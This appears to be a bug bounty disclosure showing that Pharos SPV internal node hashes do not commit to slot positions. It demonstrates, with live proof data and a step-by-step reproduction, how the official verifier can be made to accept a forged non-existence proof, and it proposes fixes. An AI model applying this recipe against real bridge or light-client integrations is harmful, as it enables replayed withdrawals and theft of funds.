# Bug Bounty Report: Pharos SPV Internal Node Position Ambiguity

**Date:** 2026-04-29  
**Target:** Pharos Network SPV / `eth_getProof` verification  
**Affected component:** Internal node hashing and non-existence proof verification  
**Severity:** Critical for any bridge/light-client integration using the official verifier or equivalent logic. Current live bridge TVL impact was not proven from public sources.  
**Status:** Reproduced on live Pharos RPC (`https://rpc.pharos.xyz`)  

---

## Executive Summary

Pharos SPV internal node hashes do not commit to child slot indices.

The effective internal node hash formula used by the official verifier and confirmed against live RPC data is:

```text
H_internal = SHA256(header_3_bytes || concat(non_empty_child_hashes_in_slot_order))
```

The hash input does **not** include:

```text
slot index i
empty slots
RLP / SSZ / self-describing encoding
the full 515-byte raw internal node
```

This allows a non-empty child hash to be moved into another empty slot while preserving the same internal node hash, as long as the relative order of non-empty hashes is preserved.

The issue is exploitable against the official reference verifier semantics. A live proof for an existing account was modified so that the path slot became empty. The modified proof still reconstructed the same block `stateRoot` and was accepted by the top-level verifier as a non-existence proof when `siblingLeftmostLeafProofs` was omitted.

Observed outcome:

```text
verify_spv(original existence proof, key)          = True
existence(original)                               = True

verify_spv(forged truncated non-existence proof)  = True
existence(forged proof)                           = False
```

This means the official reference verifier accepts a proof claiming that an existing key does not exist.

---

## Impact

If a bridge, light client, or cross-chain application uses the official Pharos SPV verifier or equivalent logic and accepts omitted/empty `siblingLeftmostLeafProofs`, an attacker can forge a valid non-existence proof for an existing key.

For bridge-style applications, this can break replay/withdrawal-record checks. For example, if a bridge stores a withdrawal/nullifier record and later accepts a Pharos SPV proof that the record does not exist, the same withdrawal may be accepted again.

I did **not** identify a currently deployed mainnet bridge contract publicly using this verifier. Publicly available information indicates Pharos canonical cross-chain infrastructure uses Chainlink CCIP, and the Fiamma bridge architecture is BitVM/ZK-based. Therefore, current live TVL impact is not proven from public sources.

Recommended severity framing:

```text
Critical: for any integration using the official verifier or equivalent logic.
Protocol/reference implementation bug: confirmed.
Live deployed bridge drain: not proven from public sources.
```

---

## Sources Reviewed

Official Pharos SPV documentation:

```text
https://docs.pharosnetwork.xyz/api-and-sdk/eth-getproof-storage-state-verification
```

Official Pharos examples repository:

```text
https://github.com/PharosNetwork/examples/blob/main/spv-verification/spv_verify.py
```

Canonical cross-chain infrastructure announcement:

```text
https://www.pharos.xyz/blog/pharos-adopts-chainlink-ccip-as-its-canonical-cross-chain-infrastructure-and-chainlink-data-streams-to-power-tokenized-rwa-markets
```

Fiamma bridge Pharos testnet address documentation:

```text
https://docs.fiammalabs.io/our-product-suite/pragmatically-trustless-bitvm-bitcoin-bridge/user-guides/testnet-beta/copy-of-how-to-deposit-and-withdraw-on-fiamma-bridge
```

---

## Official Verifier Logic

The official `spv_verify.py` contains:

```python
def hash_internal_node_skip_empty(proof_str: bytes) -> Optional[bytes]:
    """Hash internal node: header + non-zero slots in order."""
    if len(proof_str) != INTERNAL_NODE_BODY_LEN:
        return None
    h = hashlib.sha256()
    h.update(proof_str[:INTERNAL_NODE_HEADER])
    for i in range(INTERNAL_NODE_SLOTS):
        start = INTERNAL_NODE_HEADER + i * INTERNAL_NODE_SLOT_SIZE
        slot = proof_str[start : start + INTERNAL_NODE_SLOT_SIZE]
        if not is_all_zero(slot):
            h.update(slot)
    return h.digest()
```

Therefore:

```text
H = SHA256(header || non_empty_slot_values)
```

Notably:

```text
index i is used only to locate the slot offset
index i is not hashed
empty slots are skipped
```

The top-level verifier contains:

```python
exist = is_existence_proof(proof_nodes, key)
if not exist and sibling_list:
    ok, err = verify_sibling_proofs(proof_nodes, sibling_list, root_hash)
    if not ok:
        return False, f"{label}: {err}"
return True, None
```

Therefore, if `exist == False` and `sibling_list == []`, sibling verification is skipped and the proof is accepted if the main chain verifies.

---

## Live Proof 1: Internal Hash Formula Matches Chain Commitments

Live RPC:

```text
https://rpc.pharos.xyz
```

Request:

```text
eth_getProof(
  "0x4100000000000000000000000000000000000000",
  [],
  "latest"
)
```

Observed proof shape:

```text
proof nodes: 6
sizes: 8192, 515, 515, 515, 515, 65
```

For each internal child, I compared the hash stored in the parent slot against three candidate models:

```text
SHA256(non_empty_children_only)
SHA256(header_3_bytes || non_empty_children)
SHA256(full_515_raw_node)
```

Results:

```text
Internal child node #1 committed by parent #0
non-empty slots: 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
hash_from_chain:      0x5276db16f6f4154a7f9530c3a589393318408160dc82aee1d3698058362b091b
skip_no_header:       0x2d65c6bfc4fee24e99a7505e2cc8a72f15d9ed3704244e726d2ae91207c246cf no
skip_with_header:     0x5276db16f6f4154a7f9530c3a589393318408160dc82aee1d3698058362b091b MATCH
sha256(full_515_raw): 0x5276db16f6f4154a7f9530c3a589393318408160dc82aee1d3698058362b091b MATCH

Internal child node #3 committed by parent #2
non-empty slots: 0,2,3,5,6,8,10,11,14,15
hash_from_chain:      0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5
skip_no_header:       0x79d7fc2c8357f1652c1f43f7ddd1d5d6fa3c3b14bb4c57996831a2b4e9bf6da1 no
skip_with_header:     0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5 MATCH
sha256(full_515_raw): 0x46bb9c9c2764ea468b251f95baef31dbd1703be60c947173819438bfe2ab7198 no

Internal child node #4 committed by parent #3
non-empty slots: 1,4
hash_from_chain:      0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd
skip_no_header:       0x1390ae0cbe92ba2cbee297aff0b3e37cbfb9e93d921509fbda5543cdbde76a4e no
skip_with_header:     0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd MATCH
sha256(full_515_raw): 0x6829694a9c2d4cc2ccdd9ef13f2a9836fd1f83b8b38429725b41b1f59dd21f5d no
```

Conclusion:

```text
H_internal = SHA256(header_3_bytes || non_empty_child_hashes)
```

---

## Live Proof 2: Full Proof Chain Reconstructs `stateRoot`

Block:

```text
0x59b9ee
```

Block `stateRoot`:

```text
0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
```

Proof shape:

```text
proof node count: 6
proof sizes: 8192, 515, 515, 515, 515, 65
```

Every parent-to-child link matched:

```text
node[0] MSU Root -> node[1] Internal: MATCH
node[1] Internal -> node[2] Internal: MATCH
node[2] Internal -> node[3] Internal: MATCH
node[3] Internal -> node[4] Internal: MATCH
node[4] Internal -> node[5] Leaf: MATCH
```

Upward reconstruction:

```text
start from leaf hash:
0x17b9a017bc4a319a1adbc93e11238cf9dcc7f6f25b2435f29617875c66da3b12

after hashing node[4] Internal:
0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd

after hashing node[3] Internal:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

after hashing node[2] Internal:
0xba02bc126f1a2e28af292645b00ad09a43ee8e72f3e4b06d73690ea36c3953b1

after hashing node[1] Internal:
0xaa050297f7f6157b0867145cea890352ebc3462eee40d940b110cb7fb73f9a2b

after hashing node[0] MSU Root:
0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
```

Final check:

```text
computed root:   0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
expected root:   0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
root check:      MATCH
```

---

## Live Proof 3: Slot Move Preserves Internal Hash and Root

Block:

```text
0x59bd30
```

Selected internal node:

```text
node_index = 3
size = 515 bytes
```

Raw node hex:

```text
0x00000030c7381e25498f0631b1303746bb0dade695ec2e9d175a52eab8e261fc7db8040000000000000000000000000000000000000000000000000000000000000000c7cda1d3c3ae123085af48b46d85695ba2d8a3671c336cd7d4a4397e936807fab08cc99f467e1dd05b769d645d930e88362d7ec87b4963a7de83242bda7c68ce000000000000000000000000000000000000000000000000000000000000000013de40ba36aec809ff9ca1ddb8c88dce68a137627241cfe065f0c62a46c9d6680cdd9517d31bf10ae2a1d76b146d7c8eaa2fb1ab202a426b7fcf97f4765e9c2b00000000000000000000000000000000000000000000000000000000000000009d5d2d7bd70422271e3c63b24eac46354dab91aae648d5987da61cdf64d862b100000000000000000000000000000000000000000000000000000000000000006a7a2b8ee168d3455f92c819562b489786665111ec6a990b60271e7a01fc175f4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000269b11296cc3306e1c734ad7e64f5a115532699fe542924dfbc17a442ea876ae837d580f837dfa3bd48a95753c811b52ef268c822309a04ae2717274d6c1ba27
```

Slots:

```text
non_empty_slots = [0, 2, 3, 5, 6, 8, 10, 11, 14, 15]
empty_slots     = [1, 4, 7, 9, 12, 13]
```

Chosen move:

```text
prev = 0
src  = 2
dst  = 1
next = 3

Condition:
prev_nonempty < dst < next_nonempty
0 < 1 < 3
```

Operation:

```text
move slot[2] -> slot[1]
```

Hash result:

```text
hash_original:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_fake:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_fake == hash_original: True
```

Root result:

```text
root_original:
0xb1d3fb72148893df861e51a8c43d8d91f225d43d008f7841a6ad3fd3ec788ae0

root_fake:
0xb1d3fb72148893df861e51a8c43d8d91f225d43d008f7841a6ad3fd3ec788ae0

block_root:
0xb1d3fb72148893df861e51a8c43d8d91f225d43d008f7841a6ad3fd3ec788ae0

root_fake_eq_original: True
root_original_eq_block: True
```

This proves that the slot-position mutation can preserve the root commitment.

---

## Live Proof 4: Harmless Aliasing Case

For key:

```text
0x4100000000000000000000000000000000000000
```

Key hash:

```text
0xfc4b5e1bafc2111cad22acda289e82749ab2a8c5f0069695fe052672875f1b41
```

Verifier path slots:

```text
node[0] -> node[1]: slot=0
node[1] -> node[2]: slot=12
node[2] -> node[3]: slot=15
node[3] -> node[4]: slot=11
node[4] -> node[5]: slot=4
```

Mutation:

```text
node[3]: move slot[2] -> slot[1]
```

This mutation does not touch the path slot (`slot[11]`) for the target key.

Verifier result:

```text
hash_equal: True

verify(original, key):   True
verify(fake_proof, key): True
existence(original):     True
existence(fake):         True
leaf_same:               True
```

Classification:

```text
TRUE, but same value / same leaf.
This is structural aliasing, not yet an exploit.
```

---

## Live Proof 5: Targeted Path-Slot Move Creates Accepted Non-Existence Proof

For the same key:

```text
0x4100000000000000000000000000000000000000
```

Path slot at `node[3]`:

```text
node_index = 3
path_depth = 2
path_slot/src = 11
dst = 12
```

Before mutation:

```text
non_empty_before = [0,2,3,5,6,8,10,11,14,15]
empty_before     = [1,4,7,9,12,13]

slot[11] = 0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd
slot[12] = 0x0000000000000000000000000000000000000000000000000000000000000000
```

Operation:

```text
move slot[11] -> slot[12]
```

After mutation:

```text
slot[11] = 0x0000000000000000000000000000000000000000000000000000000000000000
slot[12] = 0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd

non_empty_after = [0,2,3,5,6,8,10,12,14,15]
```

Hash still matches:

```text
hash_original:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_fake:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_equal: True
```

Verifier results:

```text
verify(original full existence, key): True
existence(original): True

verify(fake full proof, key): False
existence(fake full): True

verify(fake truncated non-existence, key): True
existence(fake truncated): False
```

Classification:

```text
original: key exists
fake truncated proof: key does not exist
verifier accepts fake truncated proof
```

This is the exploit condition.

---

## Live Proof 6: Top-Level `verify_spv` and Sibling Proof Behavior

Official documentation says non-existence proofs include `siblingLeftmostLeafProofs`, and sibling verification is intended to protect non-existence proofs.

However, the official reference verifier only checks siblings if the list is truthy:

```python
if not exist and sibling_list:
    verify_sibling_proofs(...)
```

Observed live test:

```text
block: 0x59bff1
siblingLeftmostLeafProofs_count: 1

mutation:
node[3] path slot[11] -> empty slot[12]

hash_equal: True
```

Top-level verifier result:

```text
verify_spv(original, original_siblings): True
existence(original): True

verify_spv(fake_truncated, empty_siblings): True
existence(fake_truncated): False

verify_spv(fake_truncated, original_siblings):
False: sibling[0] proof chain verification failed
```

Interpretation:

```text
The original sibling proofs do not validate the forged proof.
But if siblingLeftmostLeafProofs is omitted or empty, the official verifier accepts the forged non-existence proof.
```

Therefore, the reference verifier treats sibling proofs as optional in practice, even though the documentation describes them as part of non-existence verification.

---

## Why This Works

Consider an internal node with non-empty slots:

```text
[0, 2, 3, 5, 6, 8, 10, 11, 14, 15]
```

The hash input is:

```text
header || H0 || H2 || H3 || H5 || H6 || H8 || H10 || H11 || H14 || H15
```

If `H11` is moved to an empty slot between its neighbors, for example `slot[12]`, the non-empty order remains:

```text
[0, 2, 3, 5, 6, 8, 10, 12, 14, 15]
```

The hash input is still:

```text
header || H0 || H2 || H3 || H5 || H6 || H8 || H10 || H11 || H14 || H15
```

So:

```text
hash(original_node) == hash(mutated_node)
```

But a verifier checking a key whose path slot is `11` sees:

```text
original slot[11] = H11       => key path continues / existence proof
mutated  slot[11] = zero      => proof terminates as non-existence
```

Because the parent commitment is unchanged, the mutated node still hashes up to the same trusted `stateRoot`.

---

## Affected Security Assumptions

The affected assumption is that an internal node hash commits to the full slot layout.

It does not.

The current commitment only binds:

```text
header
ordered sequence of non-empty child hashes
```

It does not bind:

```text
which slot each child hash occupies
which slots are empty
```

Therefore, non-existence proofs based on an empty slot are not sound unless an additional mandatory mechanism binds the full child layout.

---

## Recommended Fixes

### Preferred Fix

Hash the full fixed-size internal node:

```text
H_internal = SHA256(full_515_byte_internal_node)
```

This commits to:

```text
3-byte header
all 16 child slots
empty slots
slot positions
```

### Alternative Fix

Encode each non-empty slot index into the hash input:

```text
H_internal = SHA256(
  header ||
  index_0 || child_hash_0 ||
  index_1 || child_hash_1 ||
  ...
)
```

Example:

```python
h.update(proof_str[:3])
for i in range(16):
    slot = proof_str[3+i*32 : 3+(i+1)*32]
    if slot != b"\x00" * 32:
        h.update(bytes([i]))
        h.update(slot)
```

### Mandatory Verifier Hardening

For non-existence proofs:

```text
reject if siblingLeftmostLeafProofs is absent
reject if siblingLeftmostLeafProofs is empty
reject sibling entries with empty proofPath
verify all non-empty sibling slots, or otherwise enforce a layout commitment that makes siblings unnecessary
```

The current reference verifier should not use:

```python
if not exist and sibling_list:
```

It should require sibling proofs for non-existence:

```python
if not exist:
    if not sibling_list:
        return False, "non-existence proof requires siblingLeftmostLeafProofs"
    ok, err = verify_sibling_proofs(...)
```

However, mandatory siblings alone do not fully fix the underlying hash ambiguity unless the sibling verification proves the complete slot layout or the internal hash is changed to commit to positions.

---

## Reproduction Outline

1. Fetch a live proof:

```text
eth_getProof(
  "0x4100000000000000000000000000000000000000",
  [],
  block_number
)
```

2. Parse `accountProof`.

3. Hash each node upward:

```text
Leaf:     SHA256(65-byte leaf)
Internal: SHA256(header_3_bytes || non_empty_child_hashes_in_slot_order)
MSU Root: SHA256(8192-byte root node)
```

4. Confirm the reconstructed root equals `eth_getBlockByNumber(block).stateRoot`.

5. Select an internal node on the proof path with:

```text
path slot = non-empty
nearby empty slot exists between adjacent non-empty slots
```

6. Move the path child hash into that empty slot while preserving non-empty order.

7. Confirm:

```text
hash(mutated_internal) == hash(original_internal)
root(mutated_proof) == root(original_proof)
```

8. Truncate the proof at the mutated internal node. The path slot is now zero, so the verifier interprets it as non-existence.

9. Call top-level verification with empty `siblingLeftmostLeafProofs`.

Observed:

```text
verify_spv(fake_truncated, key, root, []) == True
is_existence_proof(fake_truncated, key) == False
```

---

## Public Consumer Review

I searched for publicly available deployed or open-source consumers of this verifier:

```text
siblingLeftmostLeafProofs
leftmostLeafKey
nextBeginOffset
proofNode
hash_internal_node_skip_empty
Pharos SPV verifier
Pharos bridge SPV
```

Findings:

```text
Official reference verifier: vulnerable behavior confirmed.
Official docs: SPV is documented for light clients and cross-chain verification.
Canonical Pharos bridge: public announcement says Chainlink CCIP.
Fiamma bridge: public docs describe BitVM/ZK architecture; no Pharos SPV verifier usage found.
Fiamma Pharos testnet address 0x40e75eF8Ea38A1e1362edD88234D327e14533992:
  - eth_getCode on Pharos mainnet RPC returned 0x
  - eth_getCode on Atlantic RPC returned 0x
```

Conclusion:

```text
No public live contract/bridge using this verifier was identified.
The vulnerability is confirmed in the official reference verifier and protocol proof model.
```

---

## Final Classification

If any production bridge/light-client integration uses the official verifier or equivalent logic:

```text
Critical
```

Because:

```text
existing key can be proven absent
root commitment remains valid
official top-level verifier accepts the forged non-existence proof when siblings are omitted
```

If no deployed integration uses it yet:

```text
High / Critical protocol-reference bug
```

Because:

```text
official documentation positions SPV for cross-chain verification
official reference verifier accepts forged non-existence proofs
future integrations following the example are vulnerable by default
```

